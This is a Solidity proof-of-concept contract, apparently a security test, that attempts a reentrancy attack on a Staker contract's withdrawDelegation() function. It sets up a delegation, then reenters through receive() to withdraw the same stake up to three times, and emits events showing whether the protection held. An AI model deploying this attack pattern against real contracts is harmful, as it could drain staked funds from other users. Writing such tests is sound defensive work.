//SPDX-License-Identifier: MIT
pragma solidity 0.8.20;
import "./staker.sol";
/**
   * @title ReentrancyAttacker
   * @dev Proof-of-concept contract to test reentrancy protection in Staker contract
   * FOR DEFENSIVE SECURITY TESTING ONLY
   *
   * Attack Vector: Exploits the withdrawDelegation() function
   * - MaliciousDelegator must be registered as the official delegator contract
   * - Creates legitimate delegation then attempts to withdraw multiple times
   * - Uses receive() fallback to reenter during VET transfer
   */
contract ReentrancyAttacker {
    Staker constant public stakerContract = Staker(payable(address(0x00000000000000000000000000005374616B6572)));

    uint256 public delegationID;
    uint256 public reentryCount;
    uint256 public maxReentries = 3;
    bool public isAttacking;

    uint256 public initialBalance;
    uint256 public finalBalance;
    uint256 public stake;

    event AttackInitiated(uint256 delegationID, uint256 stakeAmount);
    event ReentryAttempt(uint256 attemptNumber, uint256 contractBalance);
    event ReentrySucceeded(uint256 attemptNumber, uint256 amountReceived);
    event ReentryFailed(uint256 attemptNumber, string reason);
    event AttackCompleted(bool success, uint256 profit);

    /**
     * @dev Step 1: Setup - Create a legitimate delegation
       * This must be called after this contract is set as the official delegator contract
       */
    function setupDelegation(address validator, uint8 multiplier) external payable returns (uint256) {
        require(msg.value > 0, "Need VET to create delegation");
        require(!isAttacking, "Already attacking");

        stake = msg.value;
        delegationID = stakerContract.addDelegation{value: msg.value}(validator, multiplier);

        return delegationID;
    }

    /**
     * @dev Step 2: Signal exit for the delegation
       * Must wait for delegation period to complete before withdrawal
       */
    function signalExit() external {
        require(delegationID != 0, "No delegation created");
        stakerContract.signalDelegationExit(delegationID);
    }

    /**
     * @dev Step 3: Execute the reentrancy attack
       * Attempts to withdraw the same delegation multiple times
       */
    function executeAttack() external {
        require(delegationID != 0, "No delegation to attack with");
        require(!isAttacking, "Attack already in progress");

        isAttacking = true;
        reentryCount = 0;

        emit AttackInitiated(delegationID, stake);

        // Initiate first withdrawal - this will trigger receive() callback
        try stakerContract.withdrawDelegation(delegationID) {
            // First withdrawal succeeded
        } catch Error(string memory reason) {
            emit ReentryFailed(0, reason);
        } catch {
            emit ReentryFailed(0, "Unknown error");
        }

        isAttacking = false;
        finalBalance = address(this).balance;

        uint256 profit = finalBalance - stake;
        bool attackSucceeded = profit > stake;

        emit AttackCompleted(attackSucceeded, profit);
    }

    /**
     * @dev This is the reentrancy point
       * Called when Staker contract sends VET back via call{value: stake}("")
       *
       * Attack logic:
       * 1. Receive VET from first withdrawal
       * 2. Immediately call withdrawDelegation again
       * 3. If native_withdrawDelegation doesn't properly check state, we get paid twice
       * 4. Repeat until maxReentries or until attack fails
       */
    receive() external payable {
        emit ReentryAttempt(reentryCount, address(stakerContract).balance);

        if (isAttacking && reentryCount < maxReentries) {
            reentryCount++;

            // Attempt to reenter and withdraw again
            try stakerContract.withdrawDelegation(delegationID) {
                // If we get here, reentrancy succeeded - BAD for Staker contract
                emit ReentrySucceeded(reentryCount, msg.value);
            } catch Error(string memory reason) {
                // Reentrancy was blocked - GOOD, contract is protected
                emit ReentryFailed(reentryCount, reason);
            } catch (bytes memory lowLevelData) {
                // Could be revert from mutex or other protection
                emit ReentryFailed(reentryCount, "Low-level revert");
            }
        }
    }

    /**
     * @dev Extract funds after test
       */
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    /**
     * @dev Allow receiving VET
       */
    fallback() external payable {
        // Fallback for any other calls
    }
}